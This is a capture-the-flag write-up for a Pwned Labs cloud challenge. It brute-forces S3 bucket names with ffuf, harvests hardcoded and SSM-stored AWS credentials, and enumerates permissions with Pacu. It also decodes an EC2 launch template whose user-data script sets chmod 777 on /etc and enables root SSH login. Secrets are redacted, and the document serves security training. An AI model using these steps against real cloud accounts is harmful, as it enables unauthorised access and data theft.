# Challenge Lab Name: `S3 Bucket Brute Force to Breach`
<details open>
<summary><b>Scenario & Overview</b></summary>

> **Platform:** <a href="https://pwnedlabs.io" target="_blank" title="Open Pwned Labs Platform"><img src="https://img.shields.io/badge/Pwned_Labs_↗-181717?style=flat&logo=pwnedlabs&logoColor=white" style="vertical-align: middle; height: 20px;" alt="Pwned Labs Platform Link"></a> &nbsp;
>
> Huge Logistics, a global powerhouse, has enlisted your expertise to evaluate their cloud security measures. During your preliminary scans, an S3 bucket titled hlogistics-web caught your attention. Your mission is to use knowledge of the naming convention to access other S3 buckets, and pivot to other cloud services if possible.

<!-- |&nbsp; 
**Walkthrough:** <a href="YOUTUBE_VIDEO_URL" target="_blank" title="Watch Community Walkthrough"><img src="https://img.shields.io/badge/Community-Video_Walkthrough-FF0000?style=flat&logo=youtube&logoColor=white" style="vertical-align: middle; height: 20px;" alt="YouTube Walkthrough Link"></a> &nbsp; -->
</details>

## Detailed Methodology

<details open>
<summary><b>Initial Access</b></summary>
The initial access was an S3 bucket name. 

```
hlogistics-web
```
Since this doesn't give me a lot of information then the next step is to try and enumerate for more information. 

Checking the [AWS Documentation](https://docs.aws.amazon.com/AmazonS3/latest/userguide/VirtualHosting.html#virtual-hosted-style-access) I could run the `curl` command with the AWS S3 URI. 
 

```bash
└─$ curl -I https://hlogistics-web.s3.amazonaws.com/
HTTP/1.1 200 OK
x-amz-id-2: t/GTQ9RcVFQ9fFbnasuTfSGGSQbcvDEdueqCvbbLRtub6mG/yOD9rAphYkXThuWm31zXjUfO9EfSg/C3frun1/rq5SSJjKdB
x-amz-request-id: B8PEB8S7FY17HDH6
Server: AmazonS3
Date: Mon, 12 Oct 2026 19:31:59 GMT
x-amz-bucket-region: eu-west-2
x-amz-access-point-alias: false
x-amz-bucket-arn: arn:aws:s3:::hlogistics-web
Content-Type: application/xml
Transfer-Encoding: chunked
```

From the command output I could see that the S3 bucket does exist and the region for the S3 bucket is `eu-west-2`.
</details>

<details open>
<summary><b>S3 Bucket Enumeration</b></summary>

Based on how the S3 bucket name, `hlogistics-web` is formatted, it might be possible to bruteforce and see if there are any other buckets. This can be done by using common S3 bucket names as well as including other AWS regions. 

#### Common AWS S3 Bucket Names
To get a list of common S3 bucket names, I used this GitHub [repository](https://github.com/koaj/aws-s3-bucket-wordlist). 
```
org
staging
media
images
dev
files
net
cdn
uploads
bucket
public
test
uk
....
```

So instead of the original bucket name `hlogistics-web`, I could try and bruteforce for a S3 bucket name like `hlogistics-public`. 

After downloading the `list.txt` file from the GitHub repository, I went ahead and copied a list of AWS regions. 

#### AWS Region List 
```
us-west-1
us-west-2
us-east-1
us-east-2
cn-north-1
cn-northwest-1
eu-central-1
eu-north-1
eu-west-1
eu-west-2
eu-west-3
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-south-1
ap-southeast-1
ap-southeast-2
ca-central-1
me-south-1
sa-east-1
us-gov-east-1
us-gov-west-1
ap-east-1
```

This list can be found from the [table](https://docs.awas.amazon.com/global-infrastructure/latest/regions/aws-regions.html) provided by AWS. When I copied this list of AWS regions, I named the file `regions.txt`. 

### Using `ffuf` to Bruteforce for AWS S3 Buckets 

Now with these lists, I could run the `ffuf` command below to bruteforce for possible S3 buckets using the naming format of `https://hlogistics-ENVIRONMENT.s3.REGION.amazonaws.com/`. 

```bash
└─$ ffuf -u "https://hlogistics-ENVIRONMENT.s3.REGION.amazonaws.com/" -w "regions.txt:REGION" -w "list.txt:ENVIRONMENT" -mc 200,403 -v 2>/dev/null 
[Status: 200, Size: 8959, Words: 4, Lines: 2, Duration: 181ms]
| URL | https://hlogistics-images.s3.eu-west-2.amazonaws.com/
    * ENVIRONMENT: images
    * REGION: eu-west-2

[Status: 200, Size: 535, Words: 4, Lines: 2, Duration: 170ms]
| URL | https://hlogistics-web.s3.eu-west-2.amazonaws.com/
    * ENVIRONMENT: web
    * REGION: eu-west-2

[Status: 403, Size: 243, Words: 4, Lines: 2, Duration: 89ms]
| URL | https://hlogistics-storage.s3.us-east-1.amazonaws.com/
    * ENVIRONMENT: storage
    * REGION: us-east-1

[Status: 200, Size: 642, Words: 4, Lines: 2, Duration: 188ms]
| URL | https://hlogistics-beta.s3.eu-west-2.amazonaws.com/
    * ENVIRONMENT: beta
    * REGION: eu-west-2

[Status: 200, Size: 8495, Words: 4, Lines: 2, Duration: 356ms]
| URL | https://hlogistics-staticfiles.s3.eu-west-2.amazonaws.com/
    * ENVIRONMENT: staticfiles
    * REGION: eu-west-2
```
The output shown above lists the S3 buckets that followed the naming format provided. From here, I could try and view what each S3 bucket contained.

### Enumerating S3 Buckets
The S3 bucket initially provided shows an `index.html` file and when visitng the URL I could see that there was a website. 

I could view these S3 buckets by using the URL link from the `ffuf` output like below. 

<div align="center">
  <img src="../images/S3 Bucket Brute-Force-to-Breach/Pasted image 20261012125035.png" alt="Using the `ffuf` URL provided in the command output to view the `hlogistics-web` S3 bucket." width="400" />
  <p><em>Using the `ffuf` URL provided in the command output to view the `hlogistics-web` S3 bucket.</em></p>
</div>

Or I could also run the AWS CLI command, `aws s3 ls s3://[S3 BUCKET NAME] --no-sign-request`, to view S3 buckets with no credentials.

```bash
└─$ aws s3 ls s3://hlogistics-web --no-sign-request
2023-08-19 13:41:57      19868 index.html
```
From the output I could see that the S3 bucket initially provided was hosting an `index.html` page so I navigated to it. 

<div align="center">
  <img src="../images/S3 Bucket Brute-Force-to-Breach/Pasted image 20261012125216.png" alt="Viewing the S3 bucket `hlogistics-web` index.html page." width="500" />
  <p><em>Viewing the S3 bucket `hlogistics-web` index.html page.</em></p>
</div>

Going to the `index.html` page I didn't find anything new, so I started to enumerate the other S3 buckets.


The `hlogistics-images` bucket contained images but nothing out of the ordinary. 

```bash
└─$ aws s3 ls s3://hlogistics-images --no-sign-request                              
2023-08-14 12:48:54     128917 about.jpg
2023-08-14 12:48:53       1738 apple-touch-icon.png
2023-08-14 12:48:52     122799 cargo-service.jpg
2023-08-14 12:48:54     494897 cta-bg.jpg
2023-08-14 12:48:49        491 favicon.png
2023-08-14 12:48:49      57484 features-1.jpg
2023-08-14 12:48:50      52627 features-2.jpg
2023-08-14 12:48:50      75060 features-3.jpg
2023-08-14 12:48:53     119751 features-4.jpg
2023-08-14 12:48:51     200866 hero-bg.png
2023-08-14 12:48:51      11527 hero-img.svg
2023-08-14 12:48:50     158424 logistics-service.jpg
2023-08-14 12:48:53       1071 logo.png
2023-08-14 12:48:53     106249 packaging-service.jpg
2023-08-14 12:48:55     368217 page-header.jpg
2023-08-14 12:48:54      67960 quote-bg.jpg
2023-08-14 12:48:53     113036 service-details.jpg
2023-08-14 12:48:52     139371 storage-service.jpg
2023-08-14 12:48:50      40201 team-1.jpg
2023-08-14 12:48:52      49059 team-2.jpg
2023-08-14 12:48:50      36680 team-3.jpg
2023-08-14 12:48:50      39727 testimonials-1.jpg
2023-08-14 12:48:49      57584 testimonials-2.jpg
2023-08-14 12:48:49      17247 testimonials-3.jpg
2023-08-14 12:48:53      20220 testimonials-4.jpg
2023-08-14 12:48:51      22595 testimonials-5.jpg
2023-08-14 12:48:54     299670 testimonials-bg.jpg
2023-08-14 12:48:51      97415 trucking-service.jpg
2023-08-14 12:48:52     233549 warehousing-service.jpg
                                                            
```
When I tried accessing the `hlogistics-storage` bucket, I got an `AccessDenied` error. This error meant that I needed valid credentials to view the S3 bucket contents. 

```bash
└─$ aws s3 ls s3://hlogistics-storage --no-sign-request

aws: [ERROR]: An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```

The `hlogistics-staticfiles` bucket contained a lot of CSS and JS files but nothing to really dive into. 

```bash
└─$ aws s3 ls s3://hlogistics-staticfiles --no-sign-request
                           PRE fonts/
                           PRE webfonts/
2023-08-14 12:48:48     102025 all.min.css
2023-08-14 12:48:51      28765 aos.css
2023-08-14 12:48:50      13800 aos.js
2023-08-14 12:48:49      70353 bootstrap-grid.css
2023-08-14 12:48:48      93734 bootstrap-icons.css
2023-08-14 12:48:54      81936 bootstrap-icons.min.css
2023-08-14 12:48:49      80421 bootstrap.bundle.min.js
2023-08-14 12:48:49     232914 bootstrap.min.css
2023-08-14 12:48:51     589307 bootstrap.min.css.map
2023-08-14 12:48:52      13749 glightbox.min.css
2023-08-14 12:48:53      55880 glightbox.min.js
2023-08-14 12:48:49      36026 main.css
2023-08-14 12:48:53       3728 main.js
2023-08-14 12:48:52       5409 purecounter_vanilla.js
2023-08-14 12:48:52      16493 swiper-bundle.min.css
2023-08-14 12:48:49     143706 swiper-bundle.min.js
2023-08-14 12:48:51       2649 validate.js
```

The last bucket I checked, `hlogistics-beta`, had a Python script labeled `SystemTrackingPackagesTest.py`. 

```bash
└─$ aws s3 ls s3://hlogistics-beta --no-sign-request
2026-06-15 11:21:41       3507 SystemTrackingPackagesTest.py
```
Knowing that this file might contain useful information, I downloaded it to my local machine running the command below:

```bash
└─$ aws s3 cp s3://hlogistics-beta/SystemTrackingPackagesTest.py . --no-sign-request
download: s3://hlogistics-beta/SystemTrackingPackagesTest.py to ./SystemTrackingPackagesTest.py
```
Once the Python file was downloaded, I viewed the contents of the script shown below.  


<details open>
<summary><b>SystemTrackingPackagesTest.py</b></summary>

In the script, I could see variables containing an access key, secret access key, and the AWS region for the AWS credentials provided. 

>[!NOTE]
> Any access key and secret access key in this writeup will be redacted, as well as the challenge flag.

Looking more into the script itself, I can see that these credentials are being used for the AWS Lambda service. 

```bash
└─$ cat SystemTrackingPackagesTest.py 
import sqlite3
import os
import boto3
import json

# Retrieve AWS credentials from environment variables
aws_access_key_id = 'A******'
aws_secret_access_key = '***********8'
aws_region = 'eu-west-2'

# Set up AWS Lambda client
lambda_client = boto3.client('lambda', region_name=aws_region,
                             aws_access_key_id=aws_access_key_id,
                             aws_secret_access_key=aws_secret_access_key)

class PackageTrackingSystem:
    def __init__(self):
        self.conn = sqlite3.connect('package_tracking.db')
        self.c = self.conn.cursor()

    def __del__(self):
        self.conn.close()

    def create_table(self):
        self.c.execute('''CREATE TABLE IF NOT EXISTS packages (
                         id INTEGER PRIMARY KEY AUTOINCREMENT,
                         tracking_id TEXT,
                         account_name TEXT,
                         contact_number TEXT,
                         destination TEXT,
                         pick_location TEXT)''')
        self.conn.commit()

    def add_package(self, tracking_id, account_name, contact_number, destination, pick_location):
        self.c.execute('''INSERT INTO packages (tracking_id, account_name, contact_number, destination, pick_location)
                          VALUES (?, ?, ?, ?, ?)''',
                      (tracking_id, account_name, contact_number, destination, pick_location))
        self.conn.commit()

    def get_all_packages(self):
        self.c.execute('''SELECT * FROM packages''')
        return self.c.fetchall()

    def update_package(self, package_id, **kwargs):
        update_query = 'UPDATE packages SET ' + ', '.join([f'{key}=?' for key in kwargs.keys()]) + ' WHERE id=?'
        update_values = list(kwargs.values()) + [package_id]
        self.c.execute(update_query, update_values)
        self.conn.commit()

    def delete_package(self, package_id):
        self.c.execute('DELETE FROM packages WHERE id=?', (package_id,))
        self.conn.commit()

    def invoke_lambda(self, tracking_id, account_name):
        payload = json.dumps({"tracking_id": tracking_id, "account_name": account_name})
        response = lambda_client.invoke(
            FunctionName="PackageTrackerLambda",
            InvocationType="Event",
            Payload=payload
        )
        print(f"Package '{tracking_id}' information processed and Lambda invoked.")

if __name__ == "__main__":
    tracking_system = PackageTrackingSystem()

    tracking_system.create_table()

    tracking_system.add_package('ABC123', 'John Doe', '123-456-7890', 'New York', 'Warehouse A')
    tracking_system.add_package('XYZ456', 'Jane Smith', '987-654-3210', 'Los Angeles', 'Warehouse B')
    tracking_system.add_package('DEF789', 'Bob Johnson', '555-123-4567', 'Chicago', 'Warehouse C')

    packages = tracking_system.get_all_packages()
    print("All Packages:")
    for package in packages:
        print(package)

    tracking_system.update_package(2, destination='Seattle', pick_location='Wareho

    updated_packages = tracking_system.get_all_packages()
    print("\nUpdated Packages:")
    for package in updated_packages:
        print(package)

    tracking_system.delete_package(1)

    remaining_packages = tracking_system.get_all_packages()
    print("\nRemaining Packages:")
    for package in remaining_packages:
        print(package)

    # Invoking Lambda for a package
    tracking_system.invoke_lambda('XYZ456', 'Jane Smith')
```

</details>



</details>

<details open>
<summary><b>Privilege Escalation</b></summary>

### Configuring AWS Credentials 

I configured an AWS profile using the AWS credentials and AWS region hard-coded into the Python script. 

After configuring the AWS profile, I verified that these were valid credentials by running the command below: 
```bash
└─$ aws sts get-caller-identity --profile ecollins     
{
    "UserId": "AIDATRPHKUQK3U6DLVPIY",
    "Account": "243687662613",
    "Arn": "arn:aws:iam::243687662613:user/ecollins"
}
```

From here I could see that these credentials were for the IAM user `ecollins`. Using the username, I could try and see what permissions this user had. 

### Policy Enumeration 

Originally, I tried checking to see what managed policies were attached to the IAM user `ecollins` and I could see the policy `ecollins`.
```bash
└─$ aws iam list-attached-user-policies --user-name ecollins --profile ecollins
{
    "AttachedPolicies": [
        {
            "PolicyName": "ecollins",
            "PolicyArn": "arn:aws:iam::243687662613:policy/ecollins"
        }
    ]
}
```

When I tried getting the policy version for the `ecollins` policy I got an error. Since I did not have permission to run the `GetPolicy` operation, I would not be able to see what the policy document contained. 

```bash
└─$ aws iam get-policy --policy-arn arn:aws:iam::243687662613:policy/ecollins --profile ecollins

aws: [ERROR]: An error occurred (AccessDenied) when calling the GetPolicy operation: User: arn:aws:iam::243687662613:user/ecollins is not authorized to perform: iam:GetPolicy on resource: policy arn:aws:iam::243687662613:policy/ecollins because no identity-based policy allows the iam:GetPolicy action
```

I moved on and tried to view if the IAM user `ecollins` had any inline policies attached to itself. When I ran the command below, I could see that the policy `SSM_Parameter` was attached to the IAM user. 


```bash
└─$ aws iam list-user-policies --user-name ecollins --profile ecollins       
{
    "PolicyNames": [
        "SSM_Parameter"
    ]
}
```
From here I checked to see if I could view the policy running the command below:
```bash
└─$ aws iam get-user-policy --policy-name SSM_Parameter --user-name ecollins --profile ecollins
{
    "UserName": "ecollins",
    "PolicyName": "SSM_Parameter",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": [
                    "ssm:GetParameter",
                    "ssm:DescribeParameters"
                ],
                "Resource": "arn:aws:ssm:eu-west-2:243687662613:parameter/lharris"
            }
        ]
    }
}
```

The command was successful and I could see that the current IAM user `ecollins` had permission to interact with the AWS Systems Manager. Specifically, the IAM user `ecollins` using the `GetParameter` and `DescribeParameters` actions on the SSM parameter `arn:aws:ssm:eu-west-2:243687662613:parameter/lharris`. 

### SSM Parameters 

Having permission to view the SSM parameter `lharris` meant that it was possible for me to view any sensitive information or configuration data that was inputted into this parameter. 

With that in mind, I ran the command to view the value stored in the SSM paramter `lharris`. 

```bash
└─$ aws ssm get-parameter --name lharris --profile ecollins
{
    "Parameter": {
        "Name": "lharris",
        "Type": "StringList",
        "Value": "A**********,J**************",
        "Version": 3,
        "LastModifiedDate": "2026-06-15T11:22:58.298000-07:00",
        "ARN": "arn:aws:ssm:eu-west-2:243687662613:parameter/lharris",
        "DataType": "text"
    }
}
```
The output showed me an access key and a secret access key. With this new set of credentials found, I went ahead and configured another AWS profile using them. 

Once the AWS profile was configured I verified that these were valid credentials. 

```bash
└─$ aws sts get-caller-identity --profile lharris          
{
    "UserId": "AIDATRPHKUQK46UGVDBGN",
    "Account": "243687662613",
    "Arn": "arn:aws:iam::243687662613:user/lharris"
}
```

I could see that I was now the IAM user `lharris`.

Like before, I tried checking the policies attached to the IAM user, managed and inline, but when I tried running `list-attached-user-policies` and `list-user-policies` I got an `AccessDenied` error.  


#### Pacu

Since the AWS CLI commands to view policies did not work I used the automated tool [Pacu](https://github.com/RhinoSecurityLabs/pacu). To find what permissions that the IAM user `lharris` had I went ahead and used the `iam__bruteforce_permissions` module. 
- This module will automatically run through all possible API calls of supported services in order to enumerate permissions. This uses the 'enumerate-iam' library by Andres Riancho.


```bash
Pacu (lharris:imported-lharris) > run iam__bruteforce_permissions --region eu-west-2
  Running module iam__bruteforce_permissions...
[iam__bruteforce_permissions] Enumerated IAM Permissions:
[iam__bruteforce_permissions] Enumerating eu-west-2
...
[iam__bruteforce_permissions] MODULE SUMMARY:

Num of IAM permissions found: 4 
```

After the module finished running I went ahead and checked what data was collected by running `data iam`. 

```bash
Pacu (lharris:imported-lharris) > data iam
{
  "permissions": {
    "allow": [
      "dynamodb:DescribeEndpoints",
      "sts:GetCallerIdentity",
      "sts:GetSessionToken",
      "ec2:DescribeLaunchTemplates"
    ],
    "deny": []
  }
}
```

From the output I could see that the IAM user `lharris` has permission to `DescribeLaunchTemplates`. 

</details>

<details open>
<summary><b>EC2 Launch Templates</b></summary>

Knowing that I now had permission to view EC2 launch templates, I went ahead and ran the command below. 

```bash
└─$ aws ec2 describe-launch-templates --profile lharris
{
    "LaunchTemplates": [
        {
            "LaunchTemplateId": "lt-05c3bbb6108e76f9b",
            "LaunchTemplateName": "SCHEDULER",
            "CreateTime": "2025-03-04T20:35:50+00:00",
            "CreatedBy": "arn:aws:iam::243687662613:root",
            "DefaultVersionNumber": 1,
            "LatestVersionNumber": 1,
            "Operator": {
                "Managed": false
            }
        }
    ]
}
```

From the output I could see that there was one EC2 Launch Template named `SCHEDULER`. Learning that user data scripts are commonly added to these templates for automatic EC2 instance configuration meant this could expose sensitive information. 

#### Check for User Data in EC2 Launch Template

To view the user data from the EC2 Launch Template I ran the command below, specifically querying for the `UserData` only. 

```bash
└─$ aws ec2 describe-launch-template-versions --launch-template-name SCHEDULER --profile lharris --query "LaunchTemplateVersions[0].LaunchTemplateData.UserData" --output text | base64 --decode
#!/bin/bash

apt install -y aws-cli docker git curl unzip httpd mysql

systemctl enable docker
systemctl start docker
usermod -aG docker ec2-user
chmod 777 /var/run/docker.sock

mkdir -p /opt/huge-logistics
cd /opt/huge-logistics

aws s3 cp s3://huge-logistics-private/config.sh .
chmod +x config.sh
./config.sh

aws configure set region us-east-1

docker pull images.huge-logistic.local/worker:latest
docker run -d --name logistics-worker -p 8080:8080 images.huge-logistic.local/worker:latest

echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
echo "AllowUsers ec2-user root" >> /etc/ssh/sshd_config
systemctl restart sshd

chmod -R 777 /etc

flag: **************   
```

From here I got the challenge flag but also got a lot more information that might be useful with later testing. 

</details>


<details open>
<summary><b>Impact & Post-Exploitation Potential</b></summary>

Initially the S3 bucket discovered was `hlogistics-web`, and after bruteforcing using common bucket names and a list of AWS regions I found more buckets. Enumerating each bucket, I found that the `hlogistics-beta` bucket contained a Python script which exposed hardcoded AWS credentials and the AWS region for an IAM user `ecollins`. Using those credentials found led to gaining permissions to view a SSM Parameter called `lharris`. The SSM Parameter `lharris` contained a set of AWS credentials, which ended up being for an IAM user `lharris`. With the `lharris` credentials I gained permission to view EC2 Launch Templates where I found a template called `SCHEDULER`. Viewing the User Data attached to the EC2 launch template `SCHEDULER` led to finding more information.  

Information that would be worth noting:
- An S3 Bucket named `huge-logistics-private`
- The user `ec2-user`and `root` user have SSH access
- The SSH service allows password authentication (not recommended)

With the information shown in the bash script it would be great to test if the `huge-logistics-private` bucket exists and see from there. 

</details>